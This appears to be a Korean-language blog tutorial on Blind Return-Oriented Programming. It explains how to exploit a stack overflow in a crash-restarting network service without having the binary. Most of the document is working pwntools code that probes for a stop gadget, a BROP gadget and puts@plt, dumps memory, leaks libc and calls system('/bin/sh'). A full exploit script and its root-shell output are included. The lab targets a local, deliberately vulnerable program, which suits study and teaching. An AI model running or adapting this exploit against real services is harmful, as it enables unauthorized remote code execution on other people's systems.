---
title: Blind Return-Oriented Programming
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-oriented programming]
math: true
mermaid: true
---

## Description

BROP는 closed-binary and source의 서비스를 공격할 때 사용한다. 공격 대상 바이너리 파일이 없는 상황에서 Exploit code를 작성할 수 있는 방법이다. BROP 공격을 사용하기 위해서 스택 오버플로와 Crash가 발생한 후 다시 시작되는 서비스가 필요하다. BROP 공격은 서비스가 crash가 발생한 후 서비스의 반응(연결이 닫히거나 유지되거나)을 이용해 완전한 원격 공격코드를 구성할 수 있다. BROP 공격은 원격 시스템으로 부터 `write()`와 같은 유용한 gadget을 가젯을 유출할 수 있다. 이러한 가젯들을 이용하여 프로그램의 메모리를 덤프 또는 서비스 프로그램의 바이너리를 추출할 수 있다. 그리고 일반적인 ROP 공격도 수행 할 수 있다.

### BROP 공격 순서

1. stack overflow영역을 찾고 canaries 값도 추출
2. 다른 가젯을 찾을 수 있도록 ROP 체인을 중지하는 stop gadget 확보
3. stop gadget을 이용하여 레지스터에 값을 저장할 수 있는 BROP gadget 확보
4. BROP gadget, stop gadget을 이용하여 필요한 함수 확보 (read, write, strcmp 등등)
5. 이 이후 부터는 일반적인 ROP와 동일하게 공격

### BROP Struct

stop gadget은 BROP gadget을 찾기 위해 꼭 필요한 gadget이다. stop gadget으로 제일 이상적인 가젯은 stack overflow 전, 후의 메시지가 동일한 것으로 해당 프로그램을 처음 부터 다시 시작하거나, 취약성이 있는 함수의 시작 주소 등이 이상적이다. BROP gadget으로는 pop instruction 많고 희소성이 있는 gadget을 찾는 것이 좋다.

다음과 같은 gadget은 POP instruction이 많고 희소성이 있기 때문에 BROP gadget으로 적합하다.

```
gdb-peda$ x/7i 0x4007ba
0x4007ba <__libc_csu_init+90>: pop    rbx
0x4007bb <__libc_csu_init+91>: pop    rbp
0x4007bc <__libc_csu_init+92>: pop    r12
0x4007be <__libc_csu_init+94>: pop    r13
0x4007c0 <__libc_csu_init+96>: pop    r14
0x4007c2 <__libc_csu_init+98>: pop    r15
0x4007c4 <__libc_csu_init+100>:    ret   
gdb-peda$ x/2i 0x4007ba + 9
0x4007c3 <__libc_csu_init+99>: pop    rdi
0x4007c4 <__libc_csu_init+100>:    ret   
gdb-peda$ x/3i 0x4007ba + 7
0x4007c1 <__libc_csu_init+97>: pop    rsi
0x4007c2 <__libc_csu_init+98>: pop    r15
0x4007c4 <__libc_csu_init+100>:    ret   
```

### Find BROP

return address에 전달한 값이 값이 BROP 주소라면 stack에 저장된 값을 레지스터에 저장하고 stop gadget으로 이동하게 된다. BROP가 아니라면 프로세스가 종료되거나 memory Leak이 발생한다.

|Number of registers|ROP structure|
|:---:|:---:|
|1|BROP Address + p64(0x41) + Stop Gadget|
|2|BROP Address + p64(0x41)*2 + Stop Gadget|
|3|BROP Address + p64(0x41)*3 + Stop Gadget|
|4|BROP Address + p64(0x41)*4 + Stop Gadget|
|5|BROP Address + p64(0x41)*5 + Stop Gadget|
|6|BROP Address + p64(0x41)*6 + Stop Gadget|

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector brop.c -o brop
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int i;
int check();
int main(void){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    setbuf(stderr,NULL);
    puts("WelCome my friend,Do you know password?");
    if(!check()){
        puts("Do not dump my memory");
    }else {
        puts("No password, no game");
    }
}
int check(){
    char buf[50];
    read(STDIN_FILENO,buf,1024);
    return strcmp(buf,"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
}
```

brop 프로그램을 10001 포트로 실행한다.

```bash
#!/bin/sh
while true; do
    num=`ps -ef | grep "socat" | grep -v "grep" | wc -l`
    if [ $num -eq 0 ]; then
        socat tcp4-listen:10001,reuseaddr,fork exec:./brop &
    fi
done
```

### Check Overflow

```c
def check_overflow():
    size=0
    i=0
    while True:
        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline('a'*i)
        try:
            recv = r.recvline()
        except Exception as e:
            r.close()
            size = i-1
            break
        r.close()
        i+=1
    return size
```

```bash
root@bs-virtual-machine:~/pwnable# python exploit.py 
[*] Overflow size: 72
```

### Check Stop Gadget

```python
def find_stop_gadget(size):
    p = log.progress("Searching for Stop gadget")
    base = 0x400000

    for offset in range(1,0x1000):
        addr = int(base + offset)

        payload = 'A' * size
        payload += p64(addr)

        if offset % 0x100 == 0:
            log.info('Progress to 0x%x' % offset)

        try:
            r = remote(ip,port,level='error')
            r.recvline()
            r.send(payload)
            recv = r.recv(timeout=0.2)
            r.close()

            if 'WelCome my friend,Do you know password?' in recv:
                p.success('Done')
                log.info('Stop Address : ' + hex(addr))
                return addr

        except Exception as e:
            r.close()
```

```bash
root@bs-virtual-machine:~/pwnable# python exploit.py 
[*] Overflow size : 72
[+] Searching for Stop gadget: Done
[*] Progress to 0x100
[*] Progress to 0x200
[*] Progress to 0x300
[*] Progress to 0x400
[*] Progress to 0x500
[*] Stop Address : 0x4005c0
```

해당 주소는 `_start()` 함수의 시작주소이다.

```
gdb-peda$ x/3i 0x4005c0
0x4005c0 <_start>:  xor    ebp,ebp
0x4005c2 <_start+2>:    mov    r9,rdx
0x4005c5 <_start+5>:    pop    rsi
```

### Check BROP Gadget

`POP` instruction이 6개인 BROP를 찾는다.

```python
def find_brop_gadget(size,stop_gadget):
    p = log.progress('Searching for BROP Gadget')
    base = 0x400000
    for offset in range(0x700,0x1000):
        if offset % 0x100 == 0:
            log.info('Progressed to 0x%x'%offset)
        
        addr = base + offset

        if maybe_brop_gadget(size,stop_gadget,addr):
            log.info('Maybe BROP Gadget : '+str(hex(addr)))
            if is_brop_gadget(size,addr):
                p.success('Done')
                log.info('Found BROP Gadget : '+str(hex(addr)))
                return addr

# Paylaod에 BROP Gadget을 찾기 위해 Return address 영역 뒤에 레지스터에 저장할 값을 저장하고 마지막에 Stop Gadget을 저장
def maybe_brop_gadget(size,stop_gadget,addr):
    try:
        payload = ''
        payload += "A"*size
        payload += p64(addr)
        payload += p64(0)*6
        payload += p64(stop_gadget)

        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline(payload)
        recv = r.recv(timeout=0.2)
        r.close()
        if 'WelCome my friend,Do you know password?' in recv:
            return True
        return False

    except Exception as e:
        r.close()
        return False

# BROP Gadget으로 추측되는 주소만을 사용해서 전달하여 예외가 발생하면 BROP Gadget으로 판단
def is_brop_gadget(size,addr):
    try:
        payload = ''
        payload += "A"*size
        payload += p64(addr)
        payload += p64(0x41)*6
    
        r = remote(ip,port,level='error')
        r.recvline()
        r.send(payload)
        recv = r.recv(timeout=0.2)
        r.close()
        return False

    except Exception as e:
        r.close()
        return True
```

다음과 같이 BROP gadget을 찾을 수 있고 `pop rdi ; ret` gadget도 찾을 수 있다.

```
[+] Searching for BROP gadget : Done
[*] Progressed to 0x100
[*] Progressed to 0x200
[*] Progressed to 0x300
[*] Progressed to 0x400
[*] Progressed to 0x500
[*] Maybe BROP Gagget : 0x4005c0
[*] Maybe BROP Gagget : 0x4005c2
[*] Maybe BROP Gagget : 0x4005c3
[*] Maybe BROP Gagget : 0x4005c5
[*] Maybe BROP Gagget : 0x4005c6
[*] Maybe BROP Gagget : 0x4005c7
[*] Maybe BROP Gagget : 0x4005c9
[*] Maybe BROP Gagget : 0x4005cd
[*] Maybe BROP Gagget : 0x4005ce
[*] Maybe BROP Gagget : 0x4005cf
[*] Maybe BROP Gagget : 0x4005d0
[*] Maybe BROP Gagget : 0x4005d6
[*] Maybe BROP Gagget : 0x4005d7
[*] Maybe BROP Gagget : 0x4005dd
[*] Maybe BROP Gagget : 0x4005de
[*] Progressed to 0x600
[*] Maybe BROP Gagget : 0x4006b6
[*] Maybe BROP Gagget : 0x4006b7
[*] Maybe BROP Gagget : 0x4006b8
[*] Maybe BROP Gagget : 0x4006ba
[*] Maybe BROP Gagget : 0x4006ce
[*] Maybe BROP Gagget : 0x4006e2
[*] Maybe BROP Gagget : 0x4006f6
[*] Progressed to 0x700
[*] Maybe BROP Gagget : 0x4007ba
[*] Finded BROP Gagget : 0x4007ba
[+] BROP Gadget : 0x4007ba
[+] RDI Gadget : 0x4007c3
```

### Get puts@plt address

해당 프로그램이 `puts`, `printf` 사용한다고 가정한다. 해당 바이너리에 PIE 설정되지 않았기 때문에 프로세스의 기본시작 주소는 0x400000이고 해당 주소엔 `7fELF`가 저장되어 있다. 즉, 다음과 같이 addr의 값을 증가시키면서, 화면에 `7fELF`가 출력된다면 해당 주소는 `puts()`의 주소라고 판단할 수 있다.

```python
def find_puts_addr(size,stop_gadget,rdi_ret):
    p = log.progress('Searching for the address of puts@plt')
    for offset in range(0x0,0x1000):
        addr = base + offset

        if addr % 0x100==0:
            log.info('Progressed to 0x%x' % offset)

        payload = 'a'*size
        payload += p64(rdi_ret)
        payload += p64(0x400000)
        payload += p64(addr)
        payload += p64(stop_gadget)

        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline(payload)
        try:
            recv = r.recv(timeout=0.2)
            print(recv)
            if recv.startswith('\x7fELF'):
                p.success('Done')
                log.success('find puts@plt addr: 0x%x' % addr)
                return addr
            r.close()
        except Exception as e:
            r.close()
```

```
[+] Searching for the address of puts@plt : Done
[*] Progressed to 0x100
[*] Progressed to 0x200
[*] Progressed to 0x300
[*] Progressed to 0x400
[*] Progressed to 0x500
[+] find puts@plt addr: 0x400555
[+] Puts plt : 0x400555
```

### Dump memory

앞에서 찾은 `puts@plt`주소를 이용하여 프로그램 메모리를 덤프가 가능하다.

```python
def memory_dump(size,stop_gadget,rdi_ret,puts_plt):
    now = base
    end = 0x401000
    dump = ""
    p=log.progress('Memory dump')
    while now < end:
        #print(hex(now))
        if now % 0x100==0:
            log.info('Progressed to 0x%x'%now)
        payload = 'A'*size
        payload += p64(rdi_ret)
        payload += p64(now)
        payload += p64(puts_plt)
        payload += p64(stop_gadget)
        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline(payload)
        data = r.recv(timeout=0.5)
        r.close()
        try:
            data = data[:data.index('\nWelCome')]
        except ValueError as e:
            data = data
        if len(data)==0:
            data='\x00'
        dump += data
        now += len(data)
    with open('memory.dump','wb') as f:
        f.write(dump)
    p.success('Done')
```

radare2로 분석 시 `puts()`의 `plt` 주소(0x400560) 및 `got` 주소(0x400566 + 0x200ab2)를 알 수 있다.

```
root@bs-virtual-machine:~/pwnable# r2 -B 0x400000 memory.dump 
Warning: read (shdr) at 0x1b30
Warning: Cannot initialize section headers
Warning: Cannot initialize strings table
[0x004005c0]> pd 10 @ 0x400555
            0x00400555    00ff         add bh, bh
            0x00400557    25b40a2000   and eax, 0x200ab4
            0x0040055c    0f1f4000     nop [rax]
            0x00400560    ff25b20a2000 jmp qword [rip+0x200ab2]
            0x00400566    6800000000   push 0x0
            0x0040056b    e9e0ffffff   jmp 0x400550
            0x00400570    ff25aa0a2000 jmp qword [rip+0x200aaa]
            0x00400576    6801000000   push 0x1 ; 0x00000001 
            0x0040057b    e9d0ffffff   jmp 0x400550
            0x00400580    ff25a20a2000 jmp qword [rip+0x200aa2]
```

### Leak address

`puts@got` 영역에 저장된 libc address를 추출할 수 있다.

```python
def leak_libc(r,size,stop_gadget,rdi_ret,puts_plt,puts_got):
    payload = ''
    payload += "A"*size
    payload += p64(rdi_ret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(stop_gadget)
    r.recvline()
    r.sendline(payload)
    leak_addr = r.recvuntil('\nWelCome my friend,Do you know password?\n',drop=True)
    leak_addr = u64(leak_addr.ljust(8,'\x00'))
    return leak_addr
```

### Libc Search

LibcSearcher 모듈을 이용해 어떤 Libc를 사용하고 있는지 확인 가능하다.

[https://github.com/lieanu/LibcSearcher](https://github.com/lieanu/LibcSearcher)

```python
from LibcSearcher import *

lib = LibcSearcher('puts', addr_puts_libc)
libcBase = addr_puts_libc - lib.dump('puts')
system_addr = libcBase + lib.dump('system')
binsh_addr = libcBase + lib.dump('str_bin_sh')

log.info('libc base : ' + hex(libcBase))
log.info('system : ' + hex(system_addr))
log.info('binsh : ' + hex(binsh_addr))
```

## Exploit code

```python
from pwn import *
from LibcSearcher import *

ip = '127.0.0.1'
port = 10001
base = 0x400000

def check_overflow():
    size=0
    i=0
    while True:
        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline('a'*i)
        try:
            recv = r.recvline()
        except Exception as e:
            r.close()
            size = i-1
            break
        r.close()
        i+=1
    return size

def find_stop_gadget(size):
    p = log.progress("Searching for Stop Gadget")

    for offset in range(0x0,0x1000):
        addr = int(base + offset)

        payload = 'A' * size
        payload += p64(addr)

        if offset % 0x100 == 0:
            log.info('Progress to 0x%x' % offset)
    
        try:
            r = remote(ip,port,level='error')
            r.recvline()
            r.send(payload)
            recv = r.recv(timeout=0.2)
            r.close()

            if 'WelCome my friend,Do you know password?' in recv:
                p.success('Done')
                log.success('Stop Address : ' + hex(addr))
                return addr
            
        except Exception as e:
            r.close()

def find_brop_gadget(size,stop_gadget):
    p = log.progress('Searching for BROP Gadget')
    for offset in range(0x700,0x1000):
        if offset % 0x100 == 0:
            log.info('Progressed to 0x%x'%offset)
        
        addr = base + offset

        if maybe_brop_gadget(size,stop_gadget,addr):
            log.info('Maybe BROP Gadget : '+str(hex(addr)))
            if is_brop_gadget(size,addr):
                p.success('Done')
                log.success('Found BROP Gadget : '+str(hex(addr)))
                return addr
            
def is_brop_gadget(size,addr):
    try:
        payload = ''
        payload += "A"*size
        payload += p64(addr)
        payload += p64(0x41)*6
    
        r = remote(ip,port,level='error')
        r.recvline()
        r.send(payload)
        recv = r.recv(timeout=0.2)
        r.close()
        return False

    except Exception as e:
        r.close()
        return True

def maybe_brop_gadget(size,stop_gadget,addr):
    try:
        payload = ''
        payload += "A"*size
        payload += p64(addr)
        payload += p64(0)*6
        payload += p64(stop_gadget)

        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline(payload)
        recv = r.recv(timeout=0.2)
        r.close()
        if 'WelCome my friend,Do you know password?' in recv:
            return True
        return False

    except Exception as e:
        r.close()
        return False

def find_puts_addr(size,stop_gadget,rdi_ret):
    p = log.progress('Searching for the address of puts@plt')
    for offset in range(0x0,0x1000):
        addr = base + offset

        if addr % 0x100==0:
            log.info('Progressed to 0x%x' % offset)
        
        payload = 'a'*size
        payload += p64(rdi_ret)
        payload += p64(0x400000)
        payload += p64(addr)
        payload += p64(stop_gadget)

        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline(payload)
        try:
            recv = r.recv(timeout=0.2)
            print(recv)
            if recv.startswith('\x7fELF'):
                p.success('Done')
                log.success('find puts@plt addr: 0x%x' % addr)
                return addr
            r.close()
        except Exception as e:
            r.close() 

def memory_dump(size,stop_gadget,rdi_ret,puts_plt):
    now = base
    end = 0x401000
    dump = ""

    p=log.progress('Memory dump')
    while now < end:
        #print(hex(now))
        if now % 0x100==0:
            log.info('Progressed to 0x%x'%now)

        payload = 'A'*size
        payload += p64(rdi_ret)
        payload += p64(now)
        payload += p64(puts_plt)
        payload += p64(stop_gadget)

        r = remote(ip,port,level='error')
        r.recvline()
        r.sendline(payload)
        data = r.recv(timeout=0.5)
        r.close()
        try:    
            data = data[:data.index('\nWelCome')]
        except ValueError as e:
            data = data

        if len(data)==0:
            data='\x00'
        dump += data
        now += len(data)

    with open('memory.dump','wb') as f:
        f.write(dump)

    p.success('Done')
        
def leak_libc(r,size,stop_gadget,rdi_ret,puts_plt,puts_got):
    payload = ''
    payload += "A"*size
    payload += p64(rdi_ret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(stop_gadget)

    r.recvline()
    r.sendline(payload)
    leak_addr = r.recvuntil('\nWelCome my friend,Do you know password?\n',drop=True)
    leak_addr = u64(leak_addr.ljust(8,'\x00'))
    return leak_addr

if __name__=="__main__": 
    
    #size = check_overflow()
    size = 72
    log.info('Overflow size: '+str(size))
    
    #stop_gadget = find_stop_gadget(size)
    stop_gadget = 0x4005c0
    log.info('Stop Gadget: '+str(hex(stop_gadget)))

    #brop_gadget = find_brop_gadget(size,stop_gadget)
    brop_gadget = 0x4007ba
    pop_rdi_ret = brop_gadget + 0x9
    log.info('RDI Gadget: '+str(hex(pop_rdi_ret)))
    
    #puts_plt = find_puts_addr(size,stop_gadget,pop_rdi_ret)
    puts_plt = 0x400555
    log.info('puts plt: '+str(hex(puts_plt)))

    #memory_dump(size,stop_gadget,pop_rdi_ret,puts_plt)
    puts_got = 0x601018
    log.info('puts got: '+str(hex(puts_got)))

    r = remote(ip,port,level='error')
    puts_libc_addr = leak_libc(r,size,stop_gadget,pop_rdi_ret,puts_plt,puts_got)
    log.info('puts libc addr: '+str(hex(puts_libc_addr)))
    
    lib = LibcSearcher('puts',puts_libc_addr)
    print(hex(lib.dump('puts')))
    libBase = puts_libc_addr - lib.dump('puts')
    system_addr = libBase + lib.dump('system')
    binsh_addr = libBase + lib.dump('str_bin_sh')

    log.info('libc base: '+str(hex(libBase)))
    log.info('system addr: '+str(hex(system_addr)))
    log.info('binsh addr: '+str(hex(binsh_addr)))
    
    payload = 'A'*size
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    r.send(payload)
    r.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable# python exploit.py 
[*] Overflow size: 72
[*] Stop Gadget: 0x4005c0
[*] RDI Gadget: 0x4007c3
[*] puts plt: 0x400555
[*] puts got: 0x601018
[*] puts libc addr: 0x7fac6913d690
Multi Results:
 0: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386)
 1: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386)
 2: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386)
 3: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
 4: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386)
Please supply more info using 
    add_condition(leaked_func, leaked_address).
You can choose it by hand
Or type 'exit' to quit:3
[+] ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) be choosed.
0x6f690
[*] libc base: 0x7fac690ce000
[*] system addr: 0x7fac69113390
[*] binsh addr: 0x7fac6925ad57
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/root/pwnable
```

## References
- [08.BROP(Blind Return Oriented Programming)](https://www.lazenca.net/pages/viewpage.action?pageId=16810286)